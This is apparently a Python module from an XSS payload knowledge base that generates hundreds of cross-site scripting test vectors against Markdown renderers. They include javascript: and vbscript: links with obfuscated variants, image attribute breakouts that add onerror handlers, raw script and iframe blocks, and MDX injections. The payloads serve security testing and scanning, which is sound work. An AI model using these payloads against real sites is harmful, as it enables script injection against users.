#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2026-01-10 UTC
Status: Massively Populated
Telegram: https://t.me/EasyProTech

Markdown XSS Vectors - Massive Generation
CommonMark, Github Flavored Markdown (GFM), MDX
Generated: 300+ Variants
"""

from ..models import PayloadEntry


def _generate_markdown_payloads():
    payloads = {}

    # 1. Link Fuzzing ([text](url))
    # Protocols to fuzz
    protocols = [
        "javascript:",
        "vbscript:",
        "data:",
        "file:",
        " \tjavascript:",
        "javascript\t:",
        "JaVaScRiPt:",
        "&#106;avascript:",
    ]
    # Payloads
    scripts = ["alert(1)", "alert`1`", "prompt(1)", "confirm(1)"]
    # Link texts (sometimes filtered)
    texts = ["click", "<a>click</a>", "![img](x)", "", " "]

    count = 0
    for proto in protocols:
        for script in scripts:
            for text in texts:
                # [text](proto:script)
                payloads[f"md_link_gen_{count}"] = PayloadEntry(
                    payload=f"[{text}]({proto}{script})",
                    contexts=["markdown", "href"],
                    severity="high",
                    cvss_score=7.0,
                    description=f"Markdown link fuzzing {count}",
                    tags=["markdown", "link", "fuzzing"],
                    reliability="medium",
                )
                count += 1

                # Reference style: [text][ref] ... [ref]: url
                payloads[f"md_ref_gen_{count}"] = PayloadEntry(
                    payload=f"[{text}][ref]\n\n[ref]: {proto}{script}",
                    contexts=["markdown", "html_content"],
                    severity="high",
                    cvss_score=7.0,
                    description=f"Markdown reference link fuzzing {count}",
                    tags=["markdown", "ref", "fuzzing"],
                    reliability="medium",
                )
                count += 1

    # 2. Image Fuzzing (![alt](url))
    # Breaking out of src attribute
    breakers = ['"', "'", " ", "\t"]
    handlers = ["onerror=alert(1)", "onload=alert(1)", "onmouseover=alert(1)"]

    for breaker in breakers:
        for handler in handlers:
            # ![alt](x" onerror=alert(1))
            payloads[f"md_img_gen_{count}"] = PayloadEntry(
                payload=f"![alt](x{breaker} {handler})",
                contexts=["markdown", "html_content"],
                severity="medium",
                cvss_score=6.0,
                description=f"Markdown image breakout {count}",
                tags=["markdown", "image", "breakout"],
                reliability="medium",
            )
            count += 1

    # 3. HTML Block Fuzzing
    # Markdown allows raw HTML. Fuzzing different block types.
    tags = ["script", "iframe", "svg", "style", "textarea", "title"]

    for tag in tags:
        # Standard block
        payloads[f"md_html_gen_{count}"] = PayloadEntry(
            payload=f"<{tag}>alert(1)</{tag}>",
            contexts=["markdown", "html_content"],
            severity="high",
            cvss_score=7.5,
            description=f"Markdown raw HTML {tag}",
            tags=["markdown", "html"],
            reliability="high",
        )
        count += 1

        # Mixed with markdown (often bypasses parsers)
        payloads[f"md_html_mixed_{count}"] = PayloadEntry(
            payload=f"**bold**\n\n<{tag}>alert(1)</{tag}>\n\n*italic*",
            contexts=["markdown", "html_content"],
            severity="high",
            cvss_score=7.5,
            description=f"Markdown mixed HTML {tag}",
            tags=["markdown", "html", "mixed"],
            reliability="high",
        )
        count += 1

    # 4. MDX (React in Markdown) Fuzzing
    # <Component prop={...} />
    mdx_payloads = [
        "import {alert} from 'xss'",
        "export const x = alert(1)",
        "<div onClick={() => alert(1)}>Click</div>",
    ]
    for p in mdx_payloads:
        payloads[f"mdx_gen_{count}"] = PayloadEntry(
            payload=p,
            contexts=["markdown"],
            severity="high",
            cvss_score=8.0,
            description=f"MDX specific injection {count}",
            tags=["markdown", "mdx", "react"],
            reliability="high",
        )
        count += 1

    return payloads


MARKDOWN_PAYLOADS = _generate_markdown_payloads()
MARKDOWN_TOTAL = len(MARKDOWN_PAYLOADS)
